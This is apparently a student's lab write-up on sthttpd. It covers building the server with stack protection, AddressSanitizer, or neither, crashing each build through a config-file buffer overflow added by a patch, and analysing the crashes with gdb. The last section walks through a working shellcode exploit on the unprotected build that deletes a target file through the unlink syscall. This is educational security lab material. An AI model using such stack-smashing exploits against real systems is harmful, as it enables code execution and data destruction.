@@ -1,0 +1,351 @@
+To start, I checked that /usr/local/cs/bin is at the start of my path by confirming that the command
+> which gcc 
+outputs “/usr/local/cs/bin/gcc”.
+
+Then I downloaded the sthttpd 2.27.0 tarball and extracted the contents using
+> tar -xvf sthttpd-2.27.0.tar
+
+Next I created a path text file with the patch text called patch.txt and applied the patch using
+> patch -p0 < patch.txt
+
+I then configured sthttp using the command
+> ./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+Next, I compiled sthttpd three times with different sets of compiler options using the following three sets of commands
+
+(SP) for strong stack protection
+> make clean
+> make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+> mv src/thttpd src/thttpd-sp
+
+(AS) for address sanitization
+> make clean
+> make CFLAGS='-g3 -m32 -O2 -fno-inline -fsanitize=address'
+> mv src/thttpd src/thttpd-as
+
+(NO) for neither
+> make clean
+> make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+> mv src/thttpd src/thttpd-no
+
+The next step is determining which ports I wanted to run my modified sthttpd daemons on by using the function (12330 + 3 * (X % 293) + Y) 
+where X is my UID and Y is (1=SP, 2=AS, 3=NO). I determined I wanted to run SP on port 12691, AS on port 12692, NO on port 12693. 
+
+Now I can run the SP shttpd daemon using the command
+> src/thttpd-sp -p 12691 -D
+
+To check that the web server works, I opened another terminal and navigated to the directory where I started 
+the httpd server and created a text file foo.txt with some content. 
+Then I ran the following command to verify that I could access the server and retrieve the content of foo.txt.
+> curl http://localhost:12691/foo.txt
+
+After verifying that the SP httpd server works, I stopped the server using control+c and ran the following two sets of commands to 
+run the AS and NO web servers and verify that they work correctly. Since I am starting the servers from the same directory, 
+I did not need to make more foo.txt files since every time I run the curl command, the foo.txt will be retrieved from the same directory.
+> src/thttpd-as -p 12692 -D
+> curl http://localhost:12692/foo.txt
+
+> src/thttpd-no -p 12693 -D
+> curl http://localhost:12693/foo.txt
+
+*******************
+CRASHING SP, AS, NO
+*******************
+
+The patch file we applied to thttpd introduced a bug that crashes thttpd under certain circumstances. Our patch file changed the function 
+fgets to read in up to 1000 characters whereas the actual buffer in the function read_config in the source code can only 
+take 100 characters after the patch. Thus if I attempt to read in over 100 characters, thttpd should crash.
+
+I tried creating a text file with over 100 characters and passing into each of the variants as a config file to attempt to 
+cause a crash. It appeared that some variants conduct checking for valid input in the config file and would not recognize 
+my config file as valid. 
+
+I then modified my text file by using the correct syntax for a config file as outlined in the thttpd man page so thttpd would actually 
+recognize my text file as a config file and not just exit the program. My text file ended up being “user=ffffffffffff..” with 150 f’s. 
+
+The commands I used to crash the thttpd variants were
+> src/thttpd-sp -p 12691 -D -C crash.txt
+> src/thttpd-as -p 12692 -D -C crash.txt
+> src/thttpd-no -p 12693 -D -C crash.txt
+
+thttpd-sp indicated stack smashing and then crashed with a segmentation fault when I passed in my config file with over 100 characters.
+thttpd-as indicated a stack buffer overflow and then aborted properly.
+thttpd-no only crashed with a segmentation fault as it has no protection against stack overflow. 
+
+**************************************************
+BACKTRACING TO FIND INSTRUCTIONS THAT CAUSED CRASH
+**************************************************
+
+**********
+SP variant
+**********
+
+To find the instruction that crashed thttpd-sp, I ran the following commands to run the executable using GDB and create a backtrace:
+> gdb --args src/thttp-sp -p 12691 -D -C crash.txt
+(gdb) set logging on
+(gdb) run
+
+After the program crashed, I conducted a backtrace using
+(gdb) bt
+
+The backtrace is 
+
+#0  0x00007ffff6db0118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db1019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e4be6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff764f344 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8597 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8560 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x0000000000666666 in ?? ()
+#8  0x0000000000000018 in ?? ()
+#9  0x00007fffffffe4f1 in ?? ()
+#10 0x00007fffffffd070 in ?? ()
+#11 0x00007fffffffcff0 in ?? ()
+#12 0x00007fffffffe210 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+By performing a trace as we did in the Pexex lab, I was able to find the machine instruction that caused the crash. I used 
+the following commands to perform a trace of the read_config function where the program crashes:
+> gdb —args src/thttpd-sp -p 12691 -D -C crash.txt
+(gdb) break read_config
+(gdb) set disassemble-next-line on
+(gdb) run
+(gdb) step
+
+I kept stepping until I reached the crash and found that the following instructions caused the crash.
+
+0x0000000000404f23<read_config+1219>thttpd.c:1190	mov 0x68(%rsp),%rax
+0x0000000000404f28<read_config+1224>thttpd.c:1190	xor %fs:0x28,%rax
+0x0000000000404f31<read_config+1233>thttpd.c:1190	jne 0x405051<read_config+1521>
+0x0000000000405051<read_config+1521>thttpd.c:1190	callq 0x4024b0<__stack_chk_fail@plt>
+
+The instructions move the canary value into %rax and checks if the value is changed using an xor instruction. Since the value is changed, 
+the program realizes that stack smashing has occurred and it jumps to the next instruction that calls a subroutine __stack_chk_fail that 
+presumably notifies the user that stack smashing happens and terminates the program. This example illustrates strong stack protection’s 
+use of canary values to protect from buffer overflow attacks.
+
+**********
+AS variant
+**********
+
+To find the instruction that crashed thttpd-as, I used the same commands as for the SP variant to run the executable using GDB:
+> gdb —args src/thttpd-as -p 12692 -D -C crash.txt
+(gdb) set logging on
+(gdb) run
+
+I was unable to use (gdb) bt since the program aborted, and gdb indicated that no stack existed anymore. I am including the output of 
+the AddressSanitizer upon aborting the program.
+
+==27757==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffbf74 at pc 0xf7a955be bp 0xffffbec8 sp 0xffffbaa0
+READ of size 157 at 0xffffbf74 thread T0
+    #0 0xf7a955bd in __interceptor_strchr ../../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:468
+    #1 0x804eb76 in read_config /u/cs/ugrad/jianan/Desktop/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x804f6fe in parse_args /u/cs/ugrad/jianan/Desktop/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x804c9e2 in main /u/cs/ugrad/jianan/Desktop/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0xf784c942 in __libc_start_main (/lib/libc.so.6+0x19942)
+    #5 0x804dd20  (/w/home.08/cs/ugrad/jianan/Desktop/sthttpd-2.27.0/src/thttpd-as+0x804dd20)
+
+Address 0xffffbf74 is located in stack of thread T0 at offset 132 in frame
+    #0 0x804eacf in read_config /u/cs/ugrad/jianan/Desktop/sthttpd-2.27.0/src/thttpd.c:1000
+
+  This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:468 in __interceptor_strchr
+Shadow bytes around the buggy address:
+  0x3ffff790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
+=>0x3ffff7e0: f1 f1 00 00 00 00 00 00 00 00 00 00 00 00[04]f4
+  0x3ffff7f0: f4 f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00
+  0x3ffff800: 00 00 00 00 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2
+  0x3ffff810: f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2
+  0x3ffff820: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff830: 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==27757==ABORTING
+
+I performed another trace using the following commands to find the machine instruction that caused the crash:
+> gdb —args src/thttpd-as -p 12692 -D -C crash.txt
+(gdb) break read_config
+(gdb) set disassemble-next-line on
+(gdb) run
+(gdb) step
+
+I kept stepping until I found that the following instruction caused the crash.
+
+0x0804eb72<read_config+178>thttpd.c:1018	call 0x804a4b0<strchr@plt>
+
+Through this function, the address sanitization takes over and eventually aborts the program because of an error due to stack buffer 
+overflow. We exit out of read_config from this line, and the called function calls other functions that perform the address sanitization 
+and eventually cause the program to crash.
+
+**********
+NO variant
+**********
+
+To find the instruction that crashed thttpd-no, I used the same commands as for the other variants to run the executable using GDB and create a backtrace:
+> gdb —args src/thttpd-no -p 12693 -D -C crash.txt
+(gdb) set logging on
+(gdb) run
+
+After the program crashed, I conducted a backtrace using
+(gdb) bt
+
+The backtrace is
+
+#0  0x0000000000666666 in ?? ()
+#1  0x0000000000000018 in ?? ()
+#2  0x00007fffffffe4f1 in ?? ()
+#3  0x00007fffffffd070 in ?? ()
+#4  0x00007fffffffcff0 in ?? ()
+#5  0x00007fffffffe210 in ?? ()
+#6  0x0000000000000000 in ?? ()
+
+I performed another trace using the following commands to find the machine instruction that caused the crash:
+> gdb —args src/thttpd-no -p 12693 -D -C crash.txt
+(gdb) break read_config
+(gdb) set disassemble-next-line on
+(gdb) run
+(gdb) step
+
+I kept stepping until I reached the crash and found that the following instruction caused the crash.
+
+0x0000000000404d9f<read_config+1215>thttpd.c:1190	retq
+
+thttpd attempted to return to memory address 0x666666 (which resulted from the characters I had introduced into the return address 
+using buffer overflow with my config file) after that instruction. This attempt to access invalid memory caused a segmentation 
+fault and the program to crash. 
+
+*********************************
+ASSEMBLY CODE FOR THTTPD VARIANTS
+*********************************
+
+I used the following three sets of commands to generate the assembly code for the SP, AS, and NO variants respectively:
+> make clean
+> make CFLAGS='-g3 -S -O2 -fno-inline -fstack-protector-strong'
+> mv src/thttpd.o src/thttpd-sp.s
+
+> make clean
+> make CFLAGS='-g3 -m32 -S -O2 -fno-inline -fsanitize=address'
+> mv src/thttpd.o src/thttpd-as.s
+
+> make clean
+> make CFLAGS='-g3 -S -O2 -fno-inline -fno-stack-protector -zexecstack'
+> mv src/thttpd.o src/thttpd-no.s
+
+After generating the assembly code files, I found the handle_read function in each file and copied the assembly code of each variant 
+into separate text files. I then used the diff utility to find the differences between the text files and store the output into another file.
+
+I first found the differences between the SP and NO variants using the following command:
+> diff -u sp.txt no.txt > diff.txt
+
+After examining my text file of differences, I found that the differences between the SP and NO variants consisted only of jump labels 
+in either the assembly code or the jump instructions. This means that the assembly code is essentially identical between the SP and NO 
+variants. The fact that the SP variant doesn’t include methods of stack protection for the handle_read function makes sense because 
+-fstack-protector-strong only generates canaries for functions that declare an array as a local variable, regardless of type or length, 
+and handle_read didn’t do that. Thus no canary was generated for handle_read, and the assembly code for SP and NO for the 
+handle_read function are essentially identical. 
+
+I then found the differences between the AS and NO variants using the following command:
+> diff -u as.txt no.txt > diff.txt
+
+After examining my text file of differences, I found that the AS and NO variants had many more differences. It appears that the AS 
+variant uses techniques such as checking using shadow memory and calling reporting functions which report an error and 
+terminate the program if buffer overflow is detected. Essentially, AS is similar to SP but checks much more memory. The AS variant 
+also has substantially more assembly code than SP or NO because of the additional memory checking that it has to accomplish.
+
+**************************************
+BUILDING EXPLOIT FOR BUG IN VARIANT NO
+**************************************
+
+To start, I created a file target.txt that I would try to remove in the working directory of the web server. To build an exploit that 
+would remove target.txt when the web server is invoked via GDB with -C, the configuration file that we pass into the server needs to 
+contain bytes that can be translated into appropriate machine instructions.
+
+We first need to find the address of the base of the line buffer in read_config that the configuration file will be read into. I ran 
+GDB and set a breakpoint at read_config using:
+> gdb —args src/thttpd-no -p 12693 -D -C crash.txt
+(gdb) break read_config
+(gdb) run
+(gdb) step
+
+I stopped stepping when I reached the line “while ( fgets( line, 1000, fp ) != (char*) 0 )”. I then ran the following command 
+to get the address of the base of the line buffer:
+(gdb) p &line
+
+
+Then I continued stepping through the code until I reached the end of the read_config function, at which point I looked at the 
+address inside %rsp, which should be that of the return address using:
+(gdb) info registers 
+
+I found that the difference between the address of the base of the buffer (0x7fffffffcee0) and the return address (0x7fffffffcf78) is 
+152 bytes. Thus my configure file needs to be 152 bytes long in the beginning to reach the return address. Knowing that, I included “
+target.txt/0” right after the return address, which is 0x7fffffffcf80. I had to find the hex representation of “target.txt” by putting 
+it inside a text file called target.txt and using:
+> xxd target.txt
+
+In the return address itself, I put the address of the return address + 19 bytes since the return address is 8 bytes and the c-string 
+with target.txt is 11 bytes long. At this address, we put an instruction to move the address of the start of the c-string into 
+the %rdi register since its the first argument that will be passed into the syscall unlink function, which we will call to remove target.txt. 
+
+I found the byte code of the appropriate move instruction by creating a file called insns.s with the contents:
+mov $0x7fffffffcf80, %rdi
+
+I then used the following commands to compile and disassemble the file to reveal the byte code:
+> gcc -c insns.s -o insns.o
+> objdump -d insns.o
+
+0:	48 bf 80 cf ff ff ff 	movabs $0x7fffffffcf80,%rdi
+7:	7f 00 00 
+
+Now I just had to find the byte code for the syscall unlink function which I did using the following commands:
+> gdb
+(gdb) disas /r unlink
+
+0x00007ffff76c40b0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax
+0x00007ffff76c40b5 <+5>:	0f 05	syscall 
+
+I only need the first two lines as the program moves 87 into %eax, which signals syscall to call unlink, and then calls syscall.
+The syscall unlink function performs the function of removing the file.
+I placed all the hex code beginning with the return address and ending with the byte code for unlink in a text file hex.txt. I then 
+found an utility that converts text representation of hex to hex called hex2raw. After downloading it to my working directory, 
+I made it n executable using:
+> chmod +x hex2raw
+
+Then I used the following command to create a file exploit.txt that contains the hex version of my exploit text:
+> cat hex.txt | ./hex2raw > raw.txt
+
+My last step was creating 152 bytes of characters in front of my exploit code including “port=“ so the buffer would overflow to 
+the start of the return address. 
+
+To run my exploit code, I need to run thttpd-no using GDB so ASLR stack randomization is turned off. I used the following commands 
+to run the exploit code:
+> gdb —args src/thttpd-no -p 12693 -D -C exploit.txt
+(gdb) run
+
+This would trigger a segmentation fault and the program would crash, but target.txt in the working directory would be deleted. 
